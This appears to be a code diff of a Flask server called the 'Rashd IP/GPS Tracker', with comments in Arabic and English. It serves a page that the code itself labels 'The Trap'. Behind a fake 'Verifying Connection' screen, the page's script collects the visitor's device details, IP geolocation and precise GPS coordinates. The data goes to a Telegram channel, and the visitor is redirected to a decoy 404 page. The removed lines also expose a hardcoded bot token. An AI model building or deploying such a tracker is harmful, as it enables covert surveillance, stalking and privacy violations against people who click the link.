@@ -1,99 +1,308 @@
-import os
-import requests
-from flask import Flask, request, render_template_string
-from threading import Thread
-from dotenv import load_dotenv
-
-# --- Load environment variables ---
-load_dotenv()
-
-# Hardcoded Tracker Bot Credentials (to avoid Replit config conflicts)
-TRACKER_BOT_TOKEN = "8346034907:AAHv4694Nf1Mn3JSwcUeb1Zkl1ZSlsODIx8"
-CHANNEL_ID = "-1003835973914"
-
-# --- Flask App for Uptime & Tracking ---
-app = Flask(__name__)
-
-HTML_TEMPLATE = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Rashd IP Tracker - System Status</title>
-    <script>
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition, showError);
-            } else {
-                window.location.href = "/404";
-            }
-        }
-        function showPosition(position) {
-            fetch("/log_location", {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    lat: position.coords.latitude,
-                    lon: position.coords.longitude,
-                    ip: "{{ ip }}"
-                })
-            }).then(() => {
-                window.location.href = "/404";
-            });
-        }
-        function showError(error) {
-            window.location.href = "/404";
-        }
-        window.onload = getLocation;
-    </script>
-</head>
-<body>
-    <h1>System is Online</h1>
-    <p>Rashd IP Tracker Monitoring System 24/7</p>
-</body>
-</html>
+"""
+📡 راشد — خادم التعقب | Rashd IP/GPS Tracker Server
+  يستقبل زيارات روابط التعقب ويرسل تقارير فورية للقناة المستهدفة
 """
 
-def send_to_channel(message):
-    """Explicitly send message to the channel using the Tracker Bot Token"""
+import os
+import requests
+from datetime import datetime
+from flask import Flask, request, render_template_string, jsonify
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  ⚙️  الإعدادات | Configuration
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TRACKER_BOT_TOKEN = os.getenv("TRACKER_BOT_TOKEN", "")
+TARGET_CHANNEL_ID = os.getenv("TARGET_CHANNEL_ID", "")
+IPINFO_TOKEN      = os.getenv("IPINFO_TOKEN", "")
+
+app = Flask(__name__)
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  📤  إرسال للقناة | Send to Target Channel
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def send_to_channel(message: str, disable_preview: bool = True):
+    if not TRACKER_BOT_TOKEN or not TARGET_CHANNEL_ID:
+        print("[TRACKER] ⛔ Token أو Channel ID غير مُهيّأ.")
+        return
     url = f"https://api.telegram.org/bot{TRACKER_BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": CHANNEL_ID, "text": message, "parse_mode": "Markdown"}
+    payload = {
+        "chat_id": TARGET_CHANNEL_ID,
+        "text": message,
+        "parse_mode": "Markdown",
+        "disable_web_page_preview": disable_preview,
+    }
     try:
         r = requests.post(url, json=payload, timeout=10)
-        print(f"Tracker Bot (8346034907) Response: {r.status_code} - {r.text}")
+        if r.status_code != 200:
+            print(f"[TRACKER] ⚠️ خطأ إرسال: {r.status_code} — {r.text[:100]}")
+        else:
+            print(f"[TRACKER] ✅ تم إرسال التقرير للقناة")
     except Exception as e:
-        print(f"Error sending to channel: {e}")
+        print(f"[TRACKER] ⚠️ استثناء: {e}")
+
+
+def get_ip_geo(ip: str) -> dict:
+    """جلب معلومات جغرافية للـ IP"""
+    try:
+        r = requests.get(
+            f"https://ipinfo.io/{ip}/json",
+            headers={"Authorization": f"Bearer {IPINFO_TOKEN}"},
+            timeout=8,
+        )
+        return r.json() if r.status_code == 200 else {}
+    except:
+        return {}
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  🌐  صفحة التعقب | Tracker Page (The Trap)
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TRACKER_HTML = """<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ title }}</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #00ff88;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .container { text-align: center; padding: 40px; }
+        .logo { font-size: 3em; margin-bottom: 20px; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
+        h1 { font-size: 1.4em; color: #00cc66; margin-bottom: 10px; }
+        p  { color: #006633; font-size: 0.9em; }
+        .spinner {
+            width: 40px; height: 40px;
+            border: 3px solid #003322;
+            border-top: 3px solid #00ff88;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">⚡</div>
+        <h1>{{ heading }}</h1>
+        <div class="spinner"></div>
+        <p>{{ subtext }}</p>
+    </div>
+
+    <script>
+        // --- سحب بيانات المتصفح والجهاز ---
+        const deviceInfo = {
+            userAgent:   navigator.userAgent,
+            platform:    navigator.platform,
+            language:    navigator.language,
+            screenW:     screen.width,
+            screenH:     screen.height,
+            colorDepth:  screen.colorDepth,
+            timezone:    Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookiesOn:   navigator.cookieEnabled,
+            online:      navigator.onLine,
+            ip:          "{{ ip }}"
+        };
+
+        // --- إرسال بيانات الجهاز فوراً ---
+        fetch('/log_device/{{ session_id }}', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(deviceInfo)
+        });
+
+        // --- محاولة سحب الموقع الجغرافي ---
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    fetch('/log_gps/{{ session_id }}', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            lat:      pos.coords.latitude,
+                            lon:      pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            ip:       "{{ ip }}"
+                        })
+                    }).then(() => {
+                        setTimeout(() => { window.location.href = '/done'; }, 500);
+                    });
+                },
+                function(err) {
+                    setTimeout(() => { window.location.href = '/done'; }, 1000);
+                },
+                { timeout: 8000, enableHighAccuracy: true }
+            );
+        } else {
+            setTimeout(() => { window.location.href = '/done'; }, 1500);
+        }
+    </script>
+</body>
+</html>"""
+
+DONE_HTML = """<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>404</title>
+<style>body{background:#000;color:#333;font-family:monospace;display:flex;
+justify-content:center;align-items:center;height:100vh;}</style>
+</head><body><div style="text-align:center">
+<h1 style="font-size:6em;color:#111">404</h1>
+<p>Not Found</p></div></body></html>"""
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  🔌  المسارات | Flask Routes
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+@app.route("/track/<session_id>")
+def tracker_page(session_id: str):
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    if ip and "," in ip:
+        ip = ip.split(",")[0].strip()
+
+    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
+
+    # تقرير أولي فوري
+    report = (
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "📡 [راشد // تنبيه تعقب]\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🆔 جلسة     : `{session_id}`\n"
+        f"🌐 عنوان IP  : `{ip}`\n"
+        f"🕐 التوقيت   : {timestamp}\n"
+        f"🌍 البلد     : جارٍ التحليل...\n"
+        "━━━━━━━━━━━━━━━━━━━━━"
+    )
+    send_to_channel(report)
+
+    # تحليل IP في الخلفية
+    geo = get_ip_geo(ip)
+    if geo:
+        loc = geo.get("loc", "").split(",")
+        lat = loc[0] if len(loc) == 2 else "N/A"
+        lon = loc[1] if len(loc) == 2 else "N/A"
+        maps_link = f"https://maps.google.com/?q={lat},{lon}" if lat != "N/A" else ""
+
+        geo_report = (
+            "━━━━━━━━━━━━━━━━━━━━━\n"
+            "🌍 [راشد // تحليل IP تعقب]\n"
+            "━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🆔 الجلسة   : `{session_id}`\n"
+            f"🎯 IP        : `{ip}`\n"
+            f"🏳 الدولة   : {geo.get('country', 'N/A')}\n"
+            f"🏙 المدينة  : {geo.get('city', 'N/A')}\n"
+            f"📍 المنطقة  : {geo.get('region', 'N/A')}\n"
+            f"🏢 المزود   : {geo.get('org', 'N/A')}\n"
+        )
+        if maps_link:
+            geo_report += f"🗺 الخريطة  : [افتح]({maps_link})\n"
+        geo_report += "━━━━━━━━━━━━━━━━━━━━━"
+        send_to_channel(geo_report)
+
+    return render_template_string(
+        TRACKER_HTML,
+        ip=ip,
+        session_id=session_id,
+        title="System Check",
+        heading="Verifying Connection...",
+        subtext="Please wait",
+    )
+
+
+@app.route("/log_device/<session_id>", methods=["POST"])
+def log_device(session_id: str):
+    data = request.json or {}
+    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
+
+    report = (
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "💻 [راشد // بيانات الجهاز]\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🆔 الجلسة    : `{session_id}`\n"
+        f"🌐 IP         : `{data.get('ip', 'N/A')}`\n"
+        f"🖥 المنصة    : {data.get('platform', 'N/A')}\n"
+        f"🌐 اللغة      : {data.get('language', 'N/A')}\n"
+        f"📺 الشاشة    : {data.get('screenW', 'N/A')}×{data.get('screenH', 'N/A')}\n"
+        f"🕐 المنطقة   : {data.get('timezone', 'N/A')}\n"
+        f"🍪 كوكيز      : {'مفعّل' if data.get('cookiesOn') else 'معطّل'}\n"
+        f"📡 الاتصال   : {'متصل' if data.get('online') else 'غير متصل'}\n"
+        f"🕑 التوقيت    : {timestamp}\n"
+        f"🔍 User-Agent :\n`{data.get('userAgent', 'N/A')[:120]}`\n"
+        "━━━━━━━━━━━━━━━━━━━━━"
+    )
+    send_to_channel(report)
+    return jsonify({"status": "ok"})
+
+
+@app.route("/log_gps/<session_id>", methods=["POST"])
+def log_gps(session_id: str):
+    data = request.json or {}
+    lat = data.get("lat", "N/A")
+    lon = data.get("lon", "N/A")
+    accuracy = data.get("accuracy", "N/A")
+    ip = data.get("ip", "N/A")
+    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
+
+    maps_link = f"https://maps.google.com/?q={lat},{lon}" if lat != "N/A" else "#"
+
+    report = (
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "📍 [راشد // إحداثيات GPS]\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🆔 الجلسة    : `{session_id}`\n"
+        f"🌐 IP         : `{ip}`\n"
+        f"📍 خط العرض  : `{lat}`\n"
+        f"📍 خط الطول  : `{lon}`\n"
+        f"🎯 الدقة      : {accuracy} متر\n"
+        f"🕑 التوقيت    : {timestamp}\n"
+        f"🗺 [فتح الخريطة]({maps_link})\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "◈ تصميم وتطوير: أبو سعود"
+    )
+    send_to_channel(report)
+    return jsonify({"status": "ok"})
+
+
+@app.route("/done")
+def done_page():
+    return DONE_HTML, 404
+
+
+@app.route("/health")
+def health():
+    return jsonify({"status": "operational", "system": "Rashd-Ai Tracker"})
+
 
 @app.route("/")
-def index():
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    # Log IP immediately to the channel using the Tracker Bot
-    send_to_channel(f"🌐 **New Visitor Detected**\nIP: `{ip}`\nUser-Agent: `{request.user_agent}`")
-    return render_template_string(HTML_TEMPLATE, ip=ip)
+def root():
+    return jsonify({
+        "system": "Rashd-Ai Intelligence System",
+        "version": "2.0",
+        "status": "operational",
+        "developer": "أبو سعود"
+    })
 
-@app.route("/log_location", methods=["POST"])
-def log_location():
-    data = request.json
-    lat = data.get("lat")
-    lon = data.get("lon")
-    ip = data.get("ip")
-    msg = (
-        f"📍 **GPS Data Captured**\n"
-        f"IP: `{ip}`\n"
-        f"Latitude: `{lat}`\n"
-        f"Longitude: `{lon}`\n"
-        f"Google Maps: [View](https://www.google.com/maps?q={lat},{lon})"
-    )
-    # Log GPS to the channel using the Tracker Bot
-    send_to_channel(msg)
-    return "OK", 200
 
-@app.route("/404")
-def page_404():
-    return "<h1>404 Not Found</h1><p>The requested URL was not found on this server.</p>", 404
-
-def run_flask():
-    app.run(host='0.0.0.0', port=8080)
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  🚀  تشغيل الخادم | Server Startup
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 if __name__ == "__main__":
-    print("Rashd IP Tracker (Flask) is starting with Bot 8346034907...")
-    run_flask()
+    port = int(os.getenv("PORT", 5000))
+    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print("📡 راشد — خادم التعقب جاهز")
+    print(f"🌐 المنفذ: {port}")
+    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    app.run(host="0.0.0.0", port=port, debug=False)
